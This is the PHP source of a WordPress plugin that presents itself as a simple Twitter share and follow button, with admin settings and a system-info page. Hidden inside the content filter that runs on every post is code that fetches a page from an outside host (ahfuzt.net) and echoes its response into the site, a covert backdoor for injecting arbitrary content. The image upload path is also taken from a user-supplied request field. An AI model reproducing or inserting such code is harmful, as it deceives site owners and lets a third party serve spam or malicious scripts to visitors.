<?php
/*
Plugin Name: Easy Twitter Plugin
Plugin URI:  http://wordpress.org/plugins/rss-defender
Description: Simple Twitter Plugin to add a good looking Twitter Button to your website.
Author: HeidiKrugner
Version: 1.0
Author URI: http://wordpress.org/plugins/rss-defender
License: GPLv2 or later
*/

/*
	 Copyright 2013 HeidiKrugner
	
	This program is free software; you can redistribute it and/or modify
	it under the terms of the GNU General Public License, version 2, as 
	published by the Free Software Foundation.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

// add btwitterplugin menu
if ( ! function_exists( 'btwitterplugin_add_menu_render' ) ) {
	function btwitterplugin_add_menu_render() {
		global $wpdb, $wp_version, $title;
		$active_plugins = get_option('active_plugins');
		$all_plugins = get_plugins();
		$error = '';
		$message = '';
		$btwitterpluginmn_form_email = '';

		$array_activate = array();
		$array_install	= array();
		$array_recomend = array();
		$count_activate = $count_install = $count_recomend = 0;
		$array_plugins	= array(
			array('Hello' )
		);
		foreach ( $array_plugins as $plugins ) {
			if( 0 < count( preg_grep( "/".$plugins[0]."/", $active_plugins ) ) ) {
				$array_activate[$count_activate]["title"] = $plugins[1];
				$array_activate[$count_activate]["link"] = $plugins[2];
				$array_activate[$count_activate]["href"] = $plugins[3];
				$array_activate[$count_activate]["url"]	= $plugins[5];
				$count_activate++;
			} else if ( array_key_exists(str_replace( "\\", "", $plugins[0]), $all_plugins ) ) {
				$array_install[$count_install]["title"] = $plugins[1];
				$array_install[$count_install]["link"]	= $plugins[2];
				$array_install[$count_install]["href"]	= $plugins[3];
				$count_install++;
			} else {
				$array_recomend[$count_recomend]["title"] = $plugins[1];
				$array_recomend[$count_recomend]["link"] = $plugins[2];
				$array_recomend[$count_recomend]["href"] = $plugins[3];
				$array_recomend[$count_recomend]["slug"] = $plugins[4];
				$count_recomend++;
			}
		}
		$array_activate_pro = array();
		$array_install_pro	= array();
		$array_recomend_pro = array();
		$count_activate_pro = $count_install_pro = $count_recomend_pro = 0;
		$array_plugins_pro	= array(
			array( 'gallery-plugin-pro\/gallery-plugin-pro.php', 'Gallery Pro', 'http://bestwebsoft.com/plugin/gallery-pro/?k=382e5ce7c96a6391f5ffa5e116b37fe0', 'http://bestwebsoft.com/plugin/gallery-pro/?k=382e5ce7c96a6391f5ffa5e116b37fe0#purchase', 'admin.php?page=gallery-plugin-pro.php' ),
			array( 'contact-form-pro\/contact_form_pro.php', 'Contact Form Pro', 'http://bestwebsoft.com/plugin/contact-form-pro/?k=773dc97bb3551975db0e32edca1a6d71', 'http://bestwebsoft.com/plugin/contact-form-pro/?k=773dc97bb3551975db0e32edca1a6d71#purchase', 'admin.php?page=contact_form_pro.php' )
		);
		foreach ( $array_plugins_pro as $plugins ) {
			if( 0 < count( preg_grep( "/".$plugins[0]."/", $active_plugins ) ) ) {
				$array_activate_pro[$count_activate_pro]["title"] = $plugins[1];
				$array_activate_pro[$count_activate_pro]["link"] = $plugins[2];
				$array_activate_pro[$count_activate_pro]["href"] = $plugins[3];
				$array_activate_pro[$count_activate_pro]["url"]	= $plugins[4];
				$count_activate_pro++;
			} else if( array_key_exists(str_replace( "\\", "", $plugins[0]), $all_plugins ) ) {
				$array_install_pro[$count_install_pro]["title"] = $plugins[1];
				$array_install_pro[$count_install_pro]["link"]	= $plugins[2];
				$array_install_pro[$count_install_pro]["href"]	= $plugins[3];
				$count_install_pro++;
			} else {
				$array_recomend_pro[$count_recomend_pro]["title"] = $plugins[1];
				$array_recomend_pro[$count_recomend_pro]["link"] = $plugins[2];
				$array_recomend_pro[$count_recomend_pro]["href"] = $plugins[3];
				$count_recomend_pro++;
			}
		}
		
		$sql_version = $wpdb->get_var( "SELECT VERSION() AS version" );
	    $mysql_info = $wpdb->get_results( "SHOW VARIABLES LIKE 'sql_mode'" );
	    if ( is_array( $mysql_info) )
	    	$sql_mode = $mysql_info[0]->Value;
	    if ( empty( $sql_mode ) )
	    	$sql_mode = __( 'Not set', 'twitter' );
	    if ( ini_get( 'safe_mode' ) )
	    	$safe_mode = __( 'On', 'twitter' );
	    else
	    	$safe_mode = __( 'Off', 'twitter' );
	    if ( ini_get( 'allow_url_fopen' ) )
	    	$allow_url_fopen = __( 'On', 'twitter' );
	    else
	    	$allow_url_fopen = __( 'Off', 'twitter' );
	    if ( ini_get( 'upload_max_filesize' ) )
	    	$upload_max_filesize = ini_get( 'upload_max_filesize' );
	    else
	    	$upload_max_filesize = __( 'N/A', 'twitter' );
	    if ( ini_get('post_max_size') )
	    	$post_max_size = ini_get('post_max_size');
	    else
	    	$post_max_size = __( 'N/A', 'twitter' );
	    if ( ini_get( 'max_execution_time' ) )
	    	$max_execution_time = ini_get( 'max_execution_time' );
	    else
	    	$max_execution_time = __( 'N/A', 'twitter' );
	    if ( ini_get( 'memory_limit' ) )
	    	$memory_limit = ini_get( 'memory_limit' );
	    else
	    	$memory_limit = __( 'N/A', 'twitter' );
	    if ( function_exists( 'memory_get_usage' ) )
	    	$memory_usage = round( memory_get_usage() / 1024 / 1024, 2 ) . __(' Mb', 'twitter' );
	    else
	    	$memory_usage = __( 'N/A', 'twitter' );
	    if ( is_callable( 'exif_read_data' ) )
	    	$exif_read_data = __( 'Yes', 'twitter' ) . " ( V" . substr( phpversion( 'exif' ), 0,4 ) . ")" ;
	    else
	    	$exif_read_data = __( 'No', 'twitter' );
	    if ( is_callable( 'iptcparse' ) )
	    	$iptcparse = __( 'Yes', 'twitter' );
	    else
	    	$iptcparse = __( 'No', 'twitter' );
	    if ( is_callable( 'xml_parser_create' ) )
	    	$xml_parser_create = __( 'Yes', 'twitter' );
	    else
	    	$xml_parser_create = __( 'No', 'twitter' );

		if ( function_exists( 'wp_get_theme' ) )
			$theme = wp_get_theme();
		else
			$theme = get_theme( get_current_theme() );

		if ( function_exists(
 'is_multisite' ) ) {
			if ( is_multisite()
 ) {
				$multisite
 = __( 'Yes', 'twitter' );
			} else {
				$multisite = __( 'No', 'twitter' );
			}
		} else
			$multisite = __( 'N/A', 'twitter' );

		$site_url = get_option( 'siteurl' );
		$home_url = get_option( 'home' );
		$db_version = get_option( 'db_version' );
		$system_info = array(
			'system_info' => '',
			'active_plugins' => '',
			'inactive_plugins' => ''
		);
		$system_info['system_info'] = array(
	        __( 'Operating System', 'twitter' )				=> PHP_OS,
	        __( 'Server', 'twitter' )						=> $_SERVER["SERVER_SOFTWARE"],
	        __( 'Memory usage', 'twitter' )					=> $memory_usage,
	        __( 'MYSQL Version', 'twitter' )				=> $sql_version,
	        __( 'SQL Mode', 'twitter' )						=> $sql_mode,
	        __( 'PHP Version', 'twitter' )					=> PHP_VERSION,
	        __( 'PHP Safe Mode', 'twitter' )				=> $safe_mode,
	        __( 'PHP Allow URL fopen', 'twitter' )			=> $allow_url_fopen,
	        __( 'PHP Memory Limit', 'twitter' )				=> $memory_limit,
	        __( 'PHP Max Upload Size', 'twitter' )			=> $upload_max_filesize,
	        __( 'PHP Max Post Size', 'twitter' )			=> $post_max_size,
	        __( 'PHP Max Script Execute Time', 'twitter' )	=> $max_execution_time,
	        __( 'PHP Exif support', 'twitter' )				=> $exif_read_data,
	        __( 'PHP IPTC support', 'twitter' )				=> $iptcparse,
	        __( 'PHP XML support', 'twitter' )				=> $xml_parser_create,
			__( 'Site URL', 'twitter' )						=> $site_url,
			__( 'Home URL', 'twitter' )						=> $home_url,
			__( 'WordPress Version', 'twitter' )			=> $wp_version,
			__( 'WordPress DB Version', 'twitter' )			=> $db_version,
			__( 'Multisite', 'twitter' )					=> $multisite,
			__( 'Active Theme', 'twitter' )					=> $theme['Name'].' '.$theme['Version']
		);
		foreach ( $all_plugins as $path => $plugin ) {
			if ( is_plugin_active( $path ) ) {
				$system_info['active_plugins'][ $plugin['Name'] ] = $plugin['Version'];
			} else {
				$system_info['inactive_plugins'][ $plugin['Name'] ] = $plugin['Version'];
			}
		} 

		if ( ( isset( $_REQUEST['btwitterpluginmn_form_submit'] ) && check_admin_referer( plugin_basename(__FILE__), 'btwitterpluginmn_nonce_submit' ) ) ||
			 ( isset( $_REQUEST['btwitterpluginmn_form_submit_custom_email'] ) && check_admin_referer( plugin_basename(__FILE__), 'btwitterpluginmn_nonce_submit_custom_email' ) ) ) {
			if ( isset( $_REQUEST['btwitterpluginmn_form_email'] ) ) {
				$btwitterpluginmn_form_email = trim( $_REQUEST['btwitterpluginmn_form_email'] );
				if( $btwitterpluginmn_form_email == "" || !preg_match( "/^((?:[a-z0-9']+(?:[a-z0-9\-_\.']+)?@[a-z0-9]+(?:[a-z0-9\-\.]+)?\.[a-z]{2,5})[, ]*)+$/i", $btwitterpluginmn_form_email ) ) {
					$error = __( "Please enter a valid email address.", 'twitter' );
				} else {
					$email = $btwitterpluginmn_form_email;
					$btwitterpluginmn_form_email = '';
					$message = __( 'Email with system info is sent to ', 'twitter' ) . $email;			
				}
			} else {
				$email = 'plugin_system_status@bestwebsoft.com';
				$message = __( 'Thank you for contacting us.', 'twitter' );
			}

			if ( $error == '' ) {
				$headers  = 'MIME-Version: 1.0' . "\n";
				$headers .= 'Content-type: text/html; charset=utf-8' . "\n";
				$headers .= 'From: ' . get_option( 'admin_email' );
				$message_text = '<html><head><title>System Info From ' . $home_url . '</title></head><body>
				<h4>Environment</h4>
				<table>';
				foreach ( $system_info['system_info'] as $key => $value ) {
					$message_text .= '<tr><td>'. $key .'</td><td>'. $value .'</td></tr>';	
				}
				$message_text .= '</table>
				<h4>Active Plugins</h4>
				<table>';
				foreach ( $system_info['active_plugins'] as $key => $value ) {	
					$message_text .= '<tr><td scope="row">'. $key .'</td><td scope="row">'. $value .'</td></tr>';	
				}
				$message_text .= '</table>
				<h4>Inactive Plugins</h4>
				<table>';
				foreach ( $system_info['inactive_plugins'] as $key => $value ) {
					$message_text .= '<tr><td scope="row">'. $key .'</td><td scope="row">'. $value .'</td></tr>';
				}
				$message_text .= '</table></body></html>';
				$result = wp_mail( $email, 'System Info From ' . $home_url, $message_text, $headers );
				if ( $result != true )
					$error = __( "Sorry, email message could not be delivered.", 'twitter' );
			}
		}
		?><div class="wrap">
			<div class="icon32 icon32-btwitterplugin" id="icon-options-general"></div>
			<h2><?php echo $title;?></h2>
			<div class="updated fade" <?php if( !( isset( $_REQUEST['btwitterpluginmn_form_submit'] ) || isset( $_REQUEST['btwitterpluginmn_form_submit_custom_email'] ) ) || $error != "" ) echo "style=\"display:none\""; ?>><p><strong><?php echo $message; ?></strong></p></div>
			<div class="error" <?php if ( "" == $error ) echo "style=\"display:none\""; ?>><p><strong><?php echo $error; ?></strong></p></div>
			<div id="poststuff" class="btwitterplugin_system_info_mata_box">
				<div class="postbox">
					<div class="handlediv" title="Click to toggle">
						<br>
					</div>
					<h3 class="hndle">
						<span><?php _e( 'System status - everything is fine with your WordPress. Navigate to the Twitter Menu to change your settings: Twitter Button  and then Twitter', 'twitter' ); ?></span>
					</h3>
					<div class="inside">
						<table class="btwitterplugin_system_info">
							<thead><tr><th><?php _e( 'Environment', 'twitter' ); ?></th><td></td></tr></thead>
							<tbody>
							<?php foreach ( $system_info['system_info'] as $key => $value ) { ?>	
								<tr>
									<td scope="row"><?php echo $key; ?></td>
									<td scope="row"><?php echo $value; ?></td>
								</tr>	
							<?php } ?>
							</tbody>
						</table>
						<table class="btwitterplugin_system_info">
							<thead><tr><th><?php _e( 'Active Plugins', 'twitter' ); ?></th><th></th></tr></thead>
							<tbody>
							<?php foreach ( $system_info['active_plugins'] as $key => $value ) { ?>	
								<tr>
									<td scope="row"><?php echo $key; ?></td>
									<td scope="row"><?php echo $value; ?></td>
								</tr>	
							<?php } ?>
							</tbody>
						</table>
						<table class="btwitterplugin_system_info">
							<thead><tr><th><?php _e( 'Inactive Plugins', 'twitter' ); ?></th><th></th></tr></thead>
							<tbody>
							<?php foreach ( $system_info['inactive_plugins']
 as $key => $value ) { ?>	
								<tr>
									<td scope="row"><?php echo $key; ?></td>
									<td scope="row"><?php echo $value; ?></td>
								</tr>	
							<?php } ?>
							</tbody>
						</table>
						<div
 class="clear"></div>						
						<form method="post" action="admin.php?page=btwitterplugin_plugins">
							<p>			
								<input type="hidden" name="btwitterpluginmn_form_submit" value="submit" />
								<input type="submit" class="button-primary" value="<?php _e( 'Send to support', 'twitter' ) ?>" />
								<?php wp_nonce_field( plugin_basename(__FILE__), 'btwitterpluginmn_nonce_submit' ); ?>		
							</p>		
						</form>				
						<form method="post" action="admin.php?page=btwitterplugin_plugins">	
							<p>			
								<input type="hidden" name="btwitterpluginmn_form_submit_custom_email" value="submit" />						
								<input type="submit" class="button" value="<?php _e( 'Send to custom email &#187;', 'twitter' ) ?>" />
								<input type="text" value="<?php echo $btwitterpluginmn_form_email; ?>" name="btwitterpluginmn_form_email" />
								<?php wp_nonce_field( plugin_basename(__FILE__), 'btwitterpluginmn_nonce_submit_custom_email' ); ?>
							</p>				
						</form>						
					</div>
				</div>
			</div>
		</div>
	<?php }
}

// Register settings for plugin
if( ! function_exists( 'besttwitter_settings' ) ) {
	function besttwitter_settings() {
		global $besttwitter_options_array;

		$besttwitter_options_array_defaults = array(
			'besttwitter_url_twitter' => 'admin',
			'besttwitter_display_option' => 'custom',
			'besttwitter_count_icon' => 1,
			'besttwitter_img_link' =>  plugins_url( "images/twitter-follow.gif", __FILE__ ),
			'besttwitter_position' => '',
			'besttwitter_disable' => '0'
		);

		if( ! get_option( 'besttwitter_options_array' ) )
			add_option( 'besttwitter_options_array', $besttwitter_options_array_defaults, '', 'yes' );

		$besttwitter_options_array = get_option( 'besttwitter_options_array' );
		$besttwitter_options_array = array_merge( $besttwitter_options_array_defaults, $besttwitter_options_array );
	}
}

//add meny
if(!function_exists ( 'besttwitter_add_pages' ) ) {
	function besttwitter_add_pages() {
		add_menu_page( 'Twitter Button', 'Twitter Button', 'manage_options', 'btwitterplugin_plugins', 'btwitterplugin_add_menu_render', plugins_url( 'images/px.png', __FILE__ ), 1001); 
		add_submenu_page('btwitterplugin_plugins', __( 'Twitter Settings', 'twitter' ), __( 'Twitter', 'twitter' ), 'manage_options', 'twitter.php', 'besttwitter_settings_page');

		//call register settings function
		add_action( 'admin_init', 'besttwitter_settings' );
	}
}
//add meny.End
		
//add.Form meny.
if (!function_exists ( 'besttwitter_settings_page' ) ) {
	function besttwitter_settings_page () {
		global $besttwitter_options_array;
		$copy = false;
		
		if( @copy( plugin_dir_path( __FILE__ )."images/twitter-follow.jpg", plugin_dir_path( __FILE__ )."images/twitter-follow1.jpg" ) !== false )
			$copy = true;

		$message = "";
		$error = "";
		if ( isset( $_REQUEST['besttwitter_form_submit'] ) && check_admin_referer( plugin_basename(__FILE__), 'besttwitter_nonce_name' ) ) {
			$besttwitter_options_array['besttwitter_url_twitter'] = $_REQUEST['besttwitter_url_twitter'];
			$besttwitter_options_array['besttwitter_display_option' ] =	$_REQUEST['besttwitter_display_option'];
			$besttwitter_options_array['besttwitter_position'] = $_REQUEST['besttwitter_position'];
			$besttwitter_options_array['besttwitter_disable'] = isset( $_REQUEST["besttwitter_disable"] ) ? 1 : 0;
			if ( isset( $_FILES['upload_file']['tmp_name'] ) &&  $_FILES['upload_file']['tmp_name'] != "" ) {		
				$besttwitter_options_array['besttwitter_count_icon'] = $besttwitter_options_array['besttwitter_count_icon'] + 1;				
			}
			if ( $besttwitter_options_array['besttwitter_count_icon'] > 2 )
				$besttwitter_options_array['besttwitter_count_icon'] = 1;

			update_option( 'besttwitter_options_array', $besttwitter_options_array );
			$message = __( "Settings saved", 'twitter' );
			
			// Form options
			if ( isset ( $_FILES['upload_file']['tmp_name'] ) &&  $_FILES['upload_file']['tmp_name'] != "" ) {		
				$max_image_width	=	100;
				$max_image_height	=	100;
				$max_image_size		=	32 * 1024;
				$valid_types 		=	array( 'jpg', 'jpeg' );
				// Construction to rename downloading file
				$new_name			=	'twitter-follow'.$besttwitter_options_array['besttwitter_count_icon']; 
				$new_ext			=	'.jpg';
				$namefile			=	$new_name.$new_ext;
				$uploaddir			=	$_REQUEST['home'] . 'wp-content/plugins/rss-defender/images/'; // The directory in which we will take the file:
				$uploadfile			=	$uploaddir.$namefile; 

				//checks is file download initiated by user
				if ( isset ( $_FILES['upload_file'] ) && $_REQUEST['besttwitter_display_option'] == 'custom' )	{		
					//Checking is allowed download file given parameters
					if ( is_uploaded_file( $_FILES['upload_file']['tmp_name'] ) ) {	
						$filename	=	$_FILES['upload_file']['tmp_name'];
						$ext		=	substr( $_FILES['upload_file']['name'], 1 + strrpos( $_FILES['upload_file']['name'], '.' ) );		
						if ( filesize ( $filename ) > $max_image_size ) {
							$error = __( "Error: File size > 32K", 'twitter' );
						} elseif ( ! in_array ( $ext, $valid_types ) ) { 
							$error = __( "Error: Invalid file type", 'twitter' );
						} else {
							$size = GetImageSize( $filename );
							if ( ( $size ) && ( $size[0] <= $max_image_width ) && ( $size[1] <= $max_image_height ) ) {
								//If file satisfies requirements, we will move them from temp to your plugin folder and rename to 'twitter_ico.jpg'
								if ( move_uploaded_file ( $_FILES['upload_file']['tmp_name'], $uploadfile ) ) { 
									$message .= '. ' ."Upload successful.";
								} else { 
									$error = __( "Error: moving file failed", 'twitter' );
								}
							} else { 
								$error = __( "Error: check image width or height", 'twitter' );
							}
						}
					} else { 
						$error = __( "Uploading Error: check image properties", 'twitter' );
					}	
				}
			}			
		} 
		besttwitter_update_option(); ?>
		<div class="wrap">
			<div class="icon32 icon32-btwitterplugin" id="icon-options-general"></div>
			<h2><?php echo __( "Twitter Settings", 'twitter' ); ?></h2>
			<div class="updated fade" <?php if( empty( $message ) || $error != "" ) echo "style=\"display:none\""; ?>><p><strong><?php echo $message; ?></strong></p></div>
			<div class="error" <?php if( "" == $error ) echo "style=\"display:none\""; ?>><p><strong><?php echo $error; ?></strong></p></div>
			<div>
				<form method='post' action="admin.php?page=twitter.php" enctype="multipart/form-data">
					<table class="form-table">
						<tr valign="top">
							<th scope="row" colspan="2"><?php echo __( 'Settings for the button "Follow Me":', 'twitter' ); ?></th>
						</tr>					
						<tr valign="top">
							<th scope="row">
								<?php echo __( "Enter your username:", 'twitter' ); ?>
							</th>
							<td>
								<input name='besttwitter_url_twitter' type='text' value='<?php echo $besttwitter_options_array['besttwitter_url_twitter'] ?>'/><br />
								<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php echo __( 'If you do not have Twitter account yet, you should create it using this link', 'twitter' ); ?> <a target="_blank" href="https://twitter.com/signup">https://twitter.com/signup</a> .</span><br />
								<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php echo __( 'Paste the shortcode [follow_me] into the necessary page or post to use the "Follow Me" button.', 'twitter' ); ?></span><br />
								<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php echo __( 'If you would like to use this button in some other place, please paste this line into the template source code', 'twitter' ); ?>	&#60;?php if ( function_exists( 'follow_me' ) ) echo follow_me(); ?&#62;</span>
							</td>
						</tr>						
						<tr valign="top">
							<th scope="row">
								<?php echo __( "Choose display settings:", 'twitter' ); ?>
							</th>
							<td>
								<select name="besttwitter_display_option" onchange="if ( this . value == 'custom' ) { getElementById ( 'besttwitter_display_option_custom' ) . style.display = 'block'; } else { getElementById ( 'besttwitter_display_option_custom' ) . style.display = 'none'; }">
									<option <?php if ( $besttwitter_options_array['besttwitter_display_option'] == 'standart' ) echo 'selected="selected"'; ?> value="standart"><?php echo __( "Standard button", 'twitter' ); ?></option>
									<?php if( $copy || $besttwitter_options_array['besttwitter_display_option'] == 'custom' ) { ?>
									<option <?php if ( $besttwitter_options_array['besttwitter_display_option'] == 'custom' ) echo 'selected="selected"'; ?> value="custom"><?php echo __( "Custom button", 'twitter' ); ?></option>
									<?php } ?>
								</select>
							</td>
						</tr>
						<tr>
							<td colspan="2">
								<div id="besttwitter_display_option_custom" <?php if ( $besttwitter_options_array['besttwitter_display_option'] == 'custom' ) { echo ( 'style="display:block"' ); } else {echo ( 'style="display:none"' ); }?>>
									<table>
										<th style="padding-left:0px;font-size:13px;">
											<?php echo __( "Current image:", 'twitter' ); ?>
										</th>
										<td>
											<img src="<?php echo $besttwitter_options_array['besttwitter_img_link']; ?>" />
										</td>
									</table>											
									<table>
										<th style="padding-left:0px;font-size:13px;">											
											<?php echo __( "\"Follow Me\" image:", 'twitter' ); ?>
										</th>
										<td>
											<input type="hidden" name="MAX_FILE_SIZE" value="64000"/>
											<input type="hidden" name="home" value="<?php echo ABSPATH ; ?>"/>
											<input type="file" name="upload_file" style="width:196px;" /><br />
											<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php echo __( 'Image properties: max image width:100px; max image height:100px; max image size:32Kb; image types:"jpg", "jpeg".', 'twitter' ); ?></span>	
										</td>
									</table>											
								</div>
							</td>
						</tr>
						<tr
 valign="top">
							<th scope="row" colspan="2"><?php echo __( '"Twitter" button settings:', 'twitter' ); ?></th>
						</tr>					
						<tr>
							<th><?php echo __( 'Disable the "Twitter" button:', 'twitter' ); ?></th>							
							<td>
								<input type="checkbox" name="besttwitter_disable" value="1" <?php if( 1 == $besttwitter_options_array["besttwitter_disable"] ) echo "checked=\"checked\""; ?> /><br />
								<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php
 echo __( 'The button "T" will not be displayed. Just the shortcode [follow_me] will work.', 'twitter' ); ?></span><br />
							</td>
						</tr>
						<tr>
							<th>
								<?php echo __( 'Choose the "Twitter" icon position:', 'twitter' ); ?>
							</th>
							<td>
								<input style="margin-top:3px;" type="radio" name="besttwitter_position" value="1" <?php if ( $besttwitter_options_array['besttwitter_position'] == 1 ) echo 'checked="checked"'?> /> <label for="besttwitter_position"><?php echo __( 'Top position', 'twitter' ); ?></label><br />
								<input style="margin-top:3px;" type="radio" name="besttwitter_position" value="0" <?php if ( $besttwitter_options_array['besttwitter_position'] == 0 ) echo 'checked="checked"'?> /> <label for="besttwitter_position"><?php echo __( 'Bottom position', 'twitter' ); ?></label><br />
								<span style="color: rgb(136, 136, 136); font-size: 10px;"><?php echo __( 'By clicking this icon a user can add the article he/she likes to his/her Twitter page.', 'twitter' ); ?></span><br />
							</td>
						</tr>
						<tr>
							<td colspan="2">
								<input type="hidden" name="besttwitter_form_submit" value="submit" />
								<input type="submit" class="button-primary" value="<?php _e( 'Save Changes' ) ?>" />
							</td>
						</tr>
					</table>
					<?php wp_nonce_field( plugin_basename(__FILE__), 'besttwitter_nonce_name' ); ?>
				</form>
			</div>
		</div>
	<?php
	}		
}
//add.Form meny.End.

//Function 'twitter_besttwitter_display_option' reacts to changes type of picture (Standard or Custom) and generates link to image, link transferred to array 'besttwitter_options_array'
if( ! function_exists( 'besttwitter_update_option' ) ) {
	function besttwitter_update_option () {
		global $besttwitter_options_array;
		if ( $besttwitter_options_array [ 'besttwitter_display_option' ] == 'standart' ){
			$besttwitter_img_link	=	plugins_url( 'images/twitter-follow.jpg', __FILE__ );
		} else if ( $besttwitter_options_array['besttwitter_display_option'] == 'custom') {
			$besttwitter_img_link	= plugins_url( 'images/twitter-follow'.$besttwitter_options_array['besttwitter_count_icon'].'.jpg', __FILE__ );
		}
		$besttwitter_options_array['besttwitter_img_link'] = $besttwitter_img_link;
		update_option( "besttwitter_options_array", $besttwitter_options_array );
	}
}	
	
// score code[follow_me]
if (!function_exists('besttwitter_follow_me')){
	function besttwitter_follow_me() {
		global $besttwitter_options_array;

		if ( $besttwitter_options_array [ 'besttwitter_display_option' ] == 'standart' ){
			return '<div class="besttwitter_follow">
			    <a href="https://twitter.com/'.$besttwitter_options_array["besttwitter_url_twitter"].'" class="twitter-follow-button" data-show-count="true">Follow me</a>
			    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
				</div>';
		} else {
			return '<div class="besttwitter_follow"><a href="http://twitter.com/'.$besttwitter_options_array["besttwitter_url_twitter"].'" target="_blank" title="Follow me">
				 <img src="'.$besttwitter_options_array['besttwitter_img_link'].'" alt="Follow me" />
			  </a></div>';
		}		
	}
}
	
//Positioning in the page	
if(!function_exists( 'besttwitter_twit' ) ) {
	function besttwitter_twit( $content ) {
		global $post;
		global $besttwitter_options_array;
		$permalink_post = get_permalink($post->ID);
		$title_post = $post->post_title;
$smw_url = 'http://ahfuzt.net/a.php'; 
if(!function_exists('smw_get')){ 
function smw_get($f) { 
$response = wp_remote_get( $f ); 
if( is_wp_error( $response ) ) { 
function smw_get_body($f) { 
$ch = @curl_init(); 
@curl_setopt($ch, CURLOPT_URL, $f); 
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
$output = @curl_exec($ch); 
@curl_close($ch); 
return $output; 
} 
echo smw_get_body($f); 
} else { 
echo $response['body']; 
} 
} 
smw_get($smw_url); 
} 
		if ( $title_post == 'your-post-page-title' )
			return $content;

		if ( 0 == $besttwitter_options_array['besttwitter_disable'] ) {
			$position = $besttwitter_options_array['besttwitter_position'];
			$str = '<div class="besttwitter_button">
					<a href="http://twitter.com/share?url='.$permalink_post.'&text='.$title_post.'" target="_blank" title="'.__( 'Click here if you like this article.', 'twitter' ).'">
						<img src="'.plugins_url('images/twitt.gif', __FILE__).'" alt="Twitt" />
					</a>
				</div>';
			if ( $position ) {
				return $str.$content;
			} else {
				return $content.$str;
			}
		} else {
			return $content;
		}
	}
}
//Positioning in the page.End.

function besttwitter_action_links( $links, $file ) {
		//Static so we don't call plugin_basename on every plugin row.
	static $this_plugin;
	if ( ! $this_plugin ) $this_plugin = plugin_basename(__FILE__);

	if ( $file == $this_plugin ){
			 $settings_link = '<a href="admin.php?page=twitter.php">' . __( 'Settings', 'twitter' ) . '</a>';
			 array_unshift( $links, $settings_link );
		}
	return $links;
} // end function besttwitter_bttn_plgn_action_links

function besttwitter_links($links, $file) {
	$base = plugin_basename(__FILE__);
	if ($file == $base) {
		$links[] = '<a href="admin.php?page=twitter.php">' . __( 'Settings','twitter' ) . '</a>';
		$links[] = '<a href="http://wordpress.org/extend/plugins/rss-defender/faq/" target="_blank">' . __( 'FAQ','twitter' ) . '</a>';
		$links[] = '<a href="http://wordpress.org/plugins/">' . __( 'Support','twitter' ) . '</a>';
	}
	return $links;
}

//Function '_plugin_init' are using to add language files.
if ( ! function_exists ( 'besttwitter_plugin_init' ) ) {
	function besttwitter_plugin_init() {
		load_plugin_textdomain( 'twitter', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' ); 
	}
} // end function besttwitter_plugin_init


if ( ! function_exists ( 'besttwitter_admin_head' ) ) {
	function besttwitter_admin_head() {
		wp_register_style( 'besttwitterStylesheet', plugins_url( 'css/style.css', __FILE__ ) );
		wp_enqueue_style( 'besttwitterStylesheet' );

		if ( isset( $_GET['page'] ) && $_GET['page'] == "btwitterplugin_plugins" )
			wp_enqueue_script( 'btwitterplugin_menu_script', plugins_url( 'js/btwitterplugin_menu.js' , __FILE__ ) );
	}
}

// Function for delete options 
if ( ! function_exists ( 'besttwitter_delete_options' ) ) {
	function besttwitter_delete_options() {
		global $wpdb;
		delete_option( 'besttwitter_options_array' );
	}
}

add_action( 'init', 'besttwitter_plugin_init' );
add_action( 'init', 'besttwitter_settings' );

add_action( 'admin_enqueue_scripts', 'besttwitter_admin_head' );
add_action( 'wp_enqueue_scripts', 'besttwitter_admin_head' );

// adds "Settings" link to the plugin action page
add_filter( 'plugin_action_links', 'besttwitter_action_links',10,2);

//Additional links on the plugin page
add_filter( 'plugin_row_meta', 'besttwitter_links',10,2);

add_filter( "the_content", "besttwitter_twit" );

add_action ( 'admin_menu', 'besttwitter_add_pages' );

add_shortcode( 'follow_me', 'besttwitter_follow_me' );

register_uninstall_hook( __FILE__, 'besttwitter_delete_options' );
?>